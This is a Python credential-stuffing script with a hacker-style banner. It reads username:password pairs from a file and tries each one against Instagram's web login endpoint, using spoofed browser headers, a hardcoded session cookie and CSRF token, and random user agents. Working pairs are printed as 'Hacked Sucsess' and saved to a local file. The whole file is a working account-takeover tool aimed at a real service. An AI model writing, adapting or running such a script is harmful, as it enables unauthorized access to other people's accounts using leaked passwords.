import requests
from user_agent import generate_user_agent
from datetime import datetime
banner = ("""

  mm                                                                                   
  @@                        @@                                                         
                            @@                                                         
*@@@  *@@@@@@@@m   m@@*@@@@@@@@@  m@*@@m   m@*@@@@@*@@@m@@@  m@*@@m  *@@@@@@@@m@@@@@m  
  @@    @@    @@   @@   **  @@   @@   @@  m@@  @@    @@* ** @@   @@    @@    @@    @@  
  !@    @!    @@   *@@@@@m  @@    m@@@!@  *!!@@@*    @!      m@@@!@    !@    @@    @@  
  !@    @!    !@        @@  @!   @!   !@  @!         @!     @!   !@    !@    !@    @@  
  !!    !!    !!   *!   @!  !!    !!!!:!  *!!!!!*    !!      !!!!:!    !!    !!    !!  
  !!    !!    !!   !!   !!  !!   !!   :!  !:         !:     !!   :!    :!    :!    !!  
: : : : :::  :!: : : :!:    ::: ::!: : !:  : :!: : : :::    :!: : !: : :!:  :::   ::!: 
𝚌𝚘𝚍𝚎𝚍 𝙱𝚢 𝙹𝙿𝙺𝙴𝚁 & 𝙳𝚎𝚖𝚘𝚗                   ::     ::                                    
                                          :::: ::                                      
                                                
""")
print(banner)
file = open('acc.txt','r').read().splitlines()

for line in file:
    user = line.split(':')[0]
    pasw = line.split(':')[1]
    url = 'https://www.instagram.com/accounts/login/ajax/'

    head = {
       'accept':'*/*',
       'accept-encoding':'gzip,deflate,br',
       'accept-language':'en-US,en;q=0.9,ar;q=0.8',
       'content-length':'269',
       'content-type':'application/x-www-form-urlencoded',
       'cookie':'ig_did=77A45489-9A4C-43AD-9CA7-FA3FAB22FE24;ig_nrcb=1;csrftoken=VOPH7fUUOP85ChEViZkd2PhLkUQoP8P8;mid=YGwlfgALAAEryeSgDseYghX2LAC-',
       'origin':'https://www.instagram.com',
       'referer':'https://www.instagram.com/',
       'sec-fetch-dest':'empty',
       'sec-fetch-mode':'cors',
       'sec-fetch-site':'same-origin',
       'user-agent': generate_user_agent() ,
       'x-csrftoken':'VOPH7fUUOP85ChEViZkd2PhLkUQoP8P8',
       'x-ig-app-id':'936619743392459',
       'x-ig-www-claim':'0',
       'x-instagram-ajax':'8a8118fa7d40',
       'x-requested-with':'XMLHttpRequest'

    }
    time_now = int(datetime.now().timestamp())
    data = {
       'username': user,
       'enc_password': f'#PWD_INSTAGRAM_BROWSER:0:{time_now}:{pasw}',
       'queryParams': {},
       'optIntoOneTap': 'false',
    }

    login = requests.post(url,headers=head,data=data).text
    if 'userId' in login:
       print(f'Hacked Sucsess => {user}:{pasw}')
       with open("Hacked.txt",'a') as ff:
          ff.write(f"user : {user}\npass : {pasw}\n\n")
    else:
       print(f'Hacked Fail => {user}:{pasw}')